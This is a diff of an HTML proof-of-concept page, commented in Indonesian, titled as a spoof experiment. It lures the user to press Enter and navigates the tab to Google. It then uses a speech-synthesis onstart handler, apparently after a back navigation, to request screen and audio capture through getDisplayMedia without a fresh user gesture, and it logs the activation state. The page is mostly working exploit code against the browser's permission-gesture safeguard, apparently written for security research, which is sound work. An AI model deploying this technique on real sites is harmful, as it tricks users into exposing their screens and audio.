@@ -1,8 +1,7 @@
 <!DOCTYPE html>
 <html>
-
 <head>
-    <title>Site A</title>
+    <title>Site A - Spoof + Video Sharing</title>
     <style>
         body {
             background-color: #ffebee;
@@ -15,7 +14,6 @@
             flex-direction: column;
             text-align: center;
         }
-
         #targetBtn {
             padding: 16px 32px;
             font-size: 18px;
@@ -24,116 +22,153 @@
             border: none;
             border-radius: 8px;
             cursor: pointer;
-            transition: transform 0.15s, box-shadow 0.15s;
+            transition: 0.15s;
             margin-top: 16px;
         }
-
         #targetBtn:hover {
             transform: scale(1.02);
             box-shadow: 0 4px 12px rgba(211, 47, 47, 0.4);
         }
-
         #status {
             font-size: 20px;
             margin-top: 20px;
-            min-height: 40px;
+            min-height: 80px;
             color: #333;
             font-weight: bold;
+            line-height: 1.4;
+            white-space: pre-wrap;
         }
-
         .speaking {
-            color: #d32f2f;
+            color: #1a73e8;
             animation: pulse 0.6s ease-in-out infinite alternate;
         }
-
         @keyframes pulse {
-            0% {
-                opacity: 0.5;
-                transform: scale(1);
-            }
-            100% {
-                opacity: 1;
-                transform: scale(1.05);
-            }
+            0% { opacity: 0.5; transform: scale(1); }
+            100% { opacity: 1; transform: scale(1.05); }
         }
     </style>
 </head>
-
 <body>
-
     <div>
-        <h3>Situs A (Origin 1)</h3>
+        <h3>Site A (Origin 1)</h3>
         <button id="targetBtn">Click this button, then PRESS "Enter"</button>
-        <div id="status">⏎ Tekan Enter untuk membuka Google & mendengar suara</div>
+        <div id="status">
+            ⏎ Tekan Enter → buka Google di tab sama<br>
+            Lalu Back → suara otomatis + minta izin Video Sharing
+        </div>
     </div>
-
     <script>
         const btn = document.getElementById('targetBtn');
         const statusEl = document.getElementById('status');
-
-        // Fokus ke tombol saat halaman dimuat
         btn.focus();
 
-        // Fungsi untuk mengucapkan satu teks, mengembalikan Promise
-        function speakText(text) {
+        // Fungsi untuk meminta izin Video Sharing (layar/kamera)
+        async function requestVideoSharing() {
+            statusEl.innerHTML = '📹 Meminta izin Video Sharing ...';
+            console.log('[permission] Attempting getDisplayMedia...');
+            try {
+                // Ganti ke getUserMedia({ video: true, audio: true }) jika mau kamera
+                const stream = await navigator.mediaDevices.getDisplayMedia({ 
+                    video: true, 
+                    audio: true 
+                });
+                console.log('[permission] SUCCESS! Stream:', stream);
+                statusEl.innerHTML = '✅ Izin Video Sharing DIBERIKAN! (Stream aktif)';
+                return stream;
+            } catch (err) {
+                console.error('[permission] FAILED:', err.name, err.message);
+                statusEl.innerHTML = `❌ Izin Video Sharing GAGAL: ${err.name} - ${err.message}`;
+                throw err;
+            }
+        }
+
+        // Fungsi mengucapkan satu teks + inject permission request di onstart
+        function speakText(text, triggerPermission = false) {
             return new Promise((resolve) => {
                 const utterance = new SpeechSynthesisUtterance(text);
                 utterance.lang = 'id-ID';
                 utterance.rate = 0.9;
                 utterance.pitch = 1.1;
                 utterance.volume = 1;
-                utterance.onend = resolve;
-                utterance.onerror = resolve;
+
+                // === INI EKSEPERIMEN UTAMA ===
+                // Saat suara mulai (otomatis setelah Back), langsung minta izin video sharing
+                if (triggerPermission) {
+                    utterance.onstart = async () => {
+                        console.log('[speech] onstart - suara "halo ganteng" dimulai!');
+                        console.log('[activation state] isActive =', navigator.userActivation.isActive);
+                        console.log('[activation state] hasBeenActive =', navigator.userActivation.hasBeenActive);
+
+                        // Panggil permission di sini (tanpa gestur user baru)
+                        await requestVideoSharing();
+                    };
+                }
+
+                utterance.onend = () => {
+                    console.log('[speech] end:', text);
+                    resolve();
+                };
+                utterance.onerror = (event) => {
+                    console.log('[speech] error', event);
+                    resolve();
+                };
+
                 window.speechSynthesis.speak(utterance);
             });
         }
 
         // Fungsi utama dengan jeda antar bagian
-        async function speakHaloGanteng() {
-            const parts = ['halo ganteng', 'halo cantik', 'halo tobrut'];
+        async function speakSequence() {
+            const parts = [
+                { text: 'halo ganteng', trigger: true },  // Hanya bagian pertama yang trigger permission
+                { text: 'halo cantik', trigger: false },
+                { text: 'halo tobrut', trigger: false }
+            ];
 
-            for (let i = 0; i < parts.length; i++) {
-                statusEl.textContent = `🔊 Mengucapkan "${parts[i]}" ...`;
-                statusEl.className = 'speaking';
-
-                await speakText(parts[i]);
-
-                if (i < parts.length - 1) {
-                    statusEl.textContent = `⏳ Jeda ...`;
-                    await new Promise(resolve => setTimeout(resolve, 600));
-                }
+            for (const part of parts) {
+                console.log('[speech] queue:', part.text);
+                await speakText(part.text, part.trigger);
+                await new Promise(resolve => setTimeout(resolve, 600));
             }
-
-            statusEl.textContent = '✅ Selesai! Tekan Enter lagi untuk mengulang.';
-            statusEl.className = '';
         }
 
         // Event listener untuk tombol Enter
         window.addEventListener('keydown', async (e) => {
-            if (e.key === 'Enter') {
-                e.preventDefault();
+            if (e.key !== 'Enter') return;
 
-                // Hentikan suara yang sedang berjalan (jika ada)
-                window.speechSynthesis.cancel();
+            e.preventDefault();
+            console.log('[keydown] Enter ditekan');
 
-                // 1. Buka Google di tab baru (navigasi duluan)
-                 window.location.href = 'https://www.google.com';
+            // Hentikan suara sebelumnya
+            window.speechSynthesis.cancel();
 
-                // 2. Setelah navigasi, putar rangkaian suara di halaman ini
-                await speakHaloGanteng();
+            // 1. Navigasi ke Google di tab SAMA (biar efek BFCache jalan)
+            console.log('[nav] Navigasi ke Google...');
+            window.location.href = 'https://www.google.com';
 
-                // (Opsional) tidak ada navigasi lagi karena sudah buka tab
-            }
+            // 2. Segera panggil speech (race condition) — suara di-queue sebelum navigasi selesai
+            //    Karena speechSynthesis global, queue tetap bertahan.
+            await speakSequence();
         });
 
-        // Klik tombol juga fokus ulang
+        // Logging BFCache
+        window.addEventListener('pagehide', (e) => {
+            console.log('[pagehide] persisted =', e.persisted);
+        });
+
+        window.addEventListener('pageshow', (e) => {
+            console.log('[pageshow] persisted =', e.persisted);
+            console.log('[pageshow] isActive =', navigator.userActivation.isActive);
+            console.log('[pageshow] hasBeenActive =', navigator.userActivation.hasBeenActive);
+            console.log('[pageshow] speech speaking =', window.speechSynthesis.speaking);
+            console.log('[pageshow] speech pending =', window.speechSynthesis.pending);
+        });
+
+        // Klik tombol untuk fokus
         btn.addEventListener('click', () => {
             btn.focus();
-            statusEl.textContent = '✅ Tombol difokuskan. Tekan Enter!';
-            statusEl.className = '';
+            statusEl.innerHTML = '✅ Tombol difokuskan. Tekan Enter!';
         });
     </script>
-
 </body>
-
 </html>
